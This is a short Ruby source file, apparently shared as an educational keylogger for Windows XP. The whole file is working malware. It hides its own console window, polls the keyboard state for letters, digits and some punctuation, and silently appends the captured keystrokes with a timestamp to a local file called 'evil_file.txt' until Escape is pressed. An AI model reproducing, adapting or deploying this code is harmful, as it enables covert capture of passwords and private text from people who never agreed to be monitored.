
# a simple hookless keylogger, tested on winxp
# written by nobot (for educational uses)

require 'Win32API'

#hide the console window. 
win = Win32API.new('kernel32' , 'GetConsoleWindow' , [] , 'L').call
Win32API.new( 'user32' , 'ShowWindow' , ['p' , 'i'] , 'i' ).call(win, 0)

#hash mapping of interesting characters to virtual keycodes
keys = Hash[' ' => 0x20, ',' => 0xBC, '.' => 0xBE]
(0x30 .. 0x39).each {|v| keys[v-0x30] = v} #numerals 0-9
(0x41 .. 0x5A).each {|v| keys[v.chr] = v} #letters A-Z

GetAsyncKeyState = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')

keys.each_value {|v| GetAsyncKeyState.call(v) }

file = File.open('evil_file.txt', 'a')
file.puts "\n" + Time.now.to_s
while true
  break if GetAsyncKeyState.call(0x1B) & 0x01 == 1 #esc
  keys.each {|k, v| file.print k if GetAsyncKeyState.call(v) & 0x01 == 1}
  sleep 0.1
end
file.close 